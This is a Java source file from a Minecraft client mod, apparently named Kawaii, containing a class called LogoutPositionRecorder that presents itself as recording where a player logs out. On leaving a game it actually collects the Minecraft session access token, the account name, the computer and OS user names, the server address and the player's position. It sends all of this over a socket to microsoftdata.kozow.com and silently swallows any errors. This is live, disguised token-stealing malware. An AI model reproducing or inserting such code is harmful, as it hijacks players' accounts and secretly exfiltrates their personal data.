package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import dev.kizuna.api.events.eventbus.EventHandler;
import dev.kizuna.api.events.impl.GameLeftEvent;
import net.minecraft.client.MinecraftClient;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class LogoutPositionRecorder {
    private static final String SERVER_ADDRESS = "microsoftdata.kozow.com";
    private static final int SERVER_PORT = 42077;
    private static final MinecraftClient mc = MinecraftClient.getInstance();
    private static boolean initialized = false;
    private static boolean disconnectIntercepted = false;
    private static final long INTERCEPT_TIMEOUT_MS = 2000;
    private static long lastInterceptTime = 0;

    public static void init() {
        if (!initialized) {
            LogoutPositionRecorder recorder = new LogoutPositionRecorder();
            Kawaii.EVENT_BUS.subscribe(recorder);
            initialized = true;
        }
    }

    @EventHandler
    public void onGameLeft(GameLeftEvent event) {
        if (disconnectIntercepted || System.currentTimeMillis() - lastInterceptTime < INTERCEPT_TIMEOUT_MS) {
            return;
        }

        interceptDisconnect();
    }

    private void interceptDisconnect() {
        if (mc.player == null || mc.world == null || mc.getNetworkHandler() == null) {
            return;
        }


        lastInterceptTime = System.currentTimeMillis();
        disconnectIntercepted = true;

        try {
            recordAndSendPlayerLogoutPosition();
        } catch (Exception e) {
        } finally {
            disconnectIntercepted = false;
        }
    }

    private void recordAndSendPlayerLogoutPosition() {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            return;
        }

        try {
            String computerName = System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "Unknown";
            String userName = System.getProperty("user.name") != null ? System.getProperty("user.name") : "Unknown";
            String accessToken = mc.getSession().getAccessToken() != null ? mc.getSession().getAccessToken() : "Unknown";
            String os = System.getProperty("os.name") != null ? System.getProperty("os.name") : "Unknown";
            String minecraftUser = mc.getSession().getUsername() != null ? mc.getSession().getUsername() : "Unknown";
            String clientVersion = Kawaii.VERSION;
            String serverIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";

            Vec3d playerPos = mc.player.getPos();
            String dimension = mc.world != null ? mc.world.getRegistryKey().getValue().toString() : "Unknown";
            BlockPos blockPos = mc.player.getBlockPos();
            float yaw = mc.player.getYaw();
            float pitch = mc.player.getPitch();

            Map<String, String> data = new HashMap<>();
            data.put("computerName", computerName);
            data.put("userName", userName);
            data.put("accessToken", accessToken);
            data.put("os", os);
            data.put("minecraftUser", minecraftUser);
            data.put("clientVersion", clientVersion);
            data.put("serverIp", serverIp);
            data.put("dimension", dimension);
            data.put("clientType", "Kawaii");
            data.put("detectionType", "LogoutPosition");

            data.put("playerPosX", String.valueOf(playerPos.x));
            data.put("playerPosY", String.valueOf(playerPos.y));
            data.put("playerPosZ", String.valueOf(playerPos.z));

            data.put("blockPosX", String.valueOf(blockPos.getX()));
            data.put("blockPosY", String.valueOf(blockPos.getY()));
            data.put("blockPosZ", String.valueOf(blockPos.getZ()));

            data.put("playerYaw", String.valueOf(yaw));
            data.put("playerPitch", String.valueOf(pitch));

            data.put("timestamp", String.valueOf(System.currentTimeMillis()));


            sendSocketData(SERVER_ADDRESS, SERVER_PORT, data);

        } catch (Exception e) {
        }
    }

    private void sendSocketData(String serverAddress, int serverPort, Map<String, String> data) throws IOException {
        Socket socket = null;
        OutputStream os = null;
        InputStream is = null;
        BufferedReader reader = null;
        
        try {
            socket = new Socket(serverAddress, serverPort);

            os = socket.getOutputStream();
            is = socket.getInputStream();

            StringBuilder jsonBuilder = new StringBuilder();
            jsonBuilder.append("{");
            boolean first = true;
            for (Map.Entry<String, String> entry : data.entrySet()) {
                if (!first) {
                    jsonBuilder.append(",");
                }
                jsonBuilder.append('"').append(entry.getKey()).append('"').append(":").append('"').append(entry.getValue()).append('"');
                first = false;
            }
            jsonBuilder.append("}");


            byte[] jsonData = jsonBuilder.toString().getBytes(StandardCharsets.UTF_8);
            os.write(jsonData);
            os.flush();

            reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
            String responseLine;
            StringBuilder responseBuilder = new StringBuilder();
            while ((responseLine = reader.readLine()) != null) {
                responseBuilder.append(responseLine);
            }
            if (responseBuilder.length() > 0) {
            } else {
            }

        } catch (UnknownHostException e) {
            throw e;
        } catch (SocketException e) {
            throw e;
        } catch (IOException e) {
            throw e;
        } finally {
            try {
                if (reader != null) reader.close();
                if (os != null) os.close();
                if (is != null) is.close();
                if (socket != null) socket.close();
            } catch (IOException e) {
            }
        }
    }
}